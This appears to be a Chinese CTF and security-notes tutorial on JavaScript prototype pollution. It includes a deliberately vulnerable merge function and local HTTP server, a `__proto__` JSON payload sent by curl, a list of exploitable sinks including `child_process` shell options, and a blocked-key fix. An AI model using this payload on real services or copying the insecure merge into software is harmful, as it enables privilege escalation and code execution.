---
title: "原型污染（Prototype Pollution）"
slug: "prototype-pollution"
date: 2026-09-02T19:38:18+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "moeCTF 2026 合乎周礼：从原型污染到属性覆盖的利用思路。"
summary: "moeCTF 2026 合乎周礼：从原型污染到属性覆盖的利用思路。"
tags: ["原型污染", "JavaScript", "Web安全"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 14
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/22.原型污染(Prototype Pollution).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/prototype-pollution/workflow.svg" alt="可控属性经过不安全的递归合并进入 Object.prototype，再影响下游 sink。" loading="lazy">
  <figcaption>图 1 · 原型污染数据链。可控属性经过不安全的递归合并进入 Object.prototype，再影响下游 sink。</figcaption>
</figure>

## 1. 最小 Node.js 复现

创建 `/tmp/proto-lab/lab.js`：

```javascript
function merge(target, source) {
  for (const key in source) {
    if (source[key] && typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const request = JSON.parse('{"__proto__":{"isAdmin":true,"polluted":"yes"}}');
merge({}, request);

console.log('isAdmin =', ({}).isAdmin);
console.log('polluted =', ({}).polluted);
```

执行：

```bash
node /tmp/proto-lab/lab.js
```

预期：

```text
isAdmin = true
polluted = yes
```

## 2. HTTP 入口复现

用原生 `http` 模块：

```javascript
const http = require('http');

function merge(target, source) {
  for (const key in source) {
    if (source[key] && typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

http.createServer((req, res) => {
  let body = '';
  req.on('data', chunk => body += chunk);
  req.on('end', () => {
    try {
      const payload = JSON.parse(body || '{}');
      merge({}, payload);
      res.end(JSON.stringify({
        isAdmin: ({}).isAdmin,
        polluted: ({}).polluted
      }));
    } catch (e) {
      res.statusCode = 400;
      res.end(e.message);
    }
  });
}).listen(8080, '127.0.0.1');
```

保存并运行：

```bash
node /tmp/proto-lab/server.js
```

发送：

```bash
curl -sS -X POST 'http://127.0.0.1:8080/' \
  -H 'Content-Type: application/json' \
  --data '{"__proto__":{"isAdmin":true,"polluted":"yes"}}'
```

## 3. 从污染到影响

原型污染本身只是“改了一个全局对象属性”，要形成漏洞还需要下游 sink 读取该属性：

```javascript
const config = {};
if (config.isAdmin) {
  console.log('admin action enabled');
}
```

常见利用点：

- 权限判断读取 `isAdmin`；
- 模板引擎读取配置属性；
- `child_process` options 中的 `shell`/`argv0`；
- 路由或序列化库读取未初始化属性。

验证时必须把“污染成功”和“影响成功”分开记录。

## 4. 修复

```javascript
const BLOCKED = new Set(['__proto__', 'constructor', 'prototype']);

function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (BLOCKED.has(key)) continue;
    if (source[key] && typeof source[key] === 'object') {
      if (!Object.hasOwn(target, key)) target[key] = {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}
```

还要：

- 使用 `Object.create(null)` 或 `Map`；
- 使用已修复的合并库；
- 对 JSON Schema 做字段白名单；
- 升级模板/CLI 依赖。

## 5. 排错

- payload 没有生效：确认 `JSON.parse` 和递归合并都存在；
- Node 新版本仍可复现：`JSON.parse` 会保留自有 `__proto__` 属性，关键是合并实现；
- 页面仍为普通用户：检查权限判断是否读取原型属性，而不是自有属性。
